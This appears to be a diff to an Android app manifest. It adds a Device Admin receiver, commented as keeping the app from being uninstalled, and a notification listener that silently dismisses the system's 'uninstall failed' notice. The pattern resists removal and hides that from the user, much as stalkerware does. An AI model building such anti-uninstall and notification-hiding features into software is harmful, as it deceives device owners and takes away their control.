@@ -104,6 +104,34 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Device Admin — while active, the app cannot be uninstalled -->
+        <receiver
+            android:name=".receiver.AdminReceiver"
+            android:description="@string/admin_description"
+            android:exported="true"
+            android:label="@string/admin_label"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Notification guard: auto-dismiss the PackageInstaller
+             "uninstall failed" notification. Requires Notification Access. -->
+        <service
+            android:name=".service.NotificationGuardListener"
+            android:description="@string/notification_guard_description"
+            android:exported="true"
+            android:label="@string/notification_guard_label"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
         <!-- Boot Receiver -->
         <receiver
             android:name=".receiver.BootReceiver"
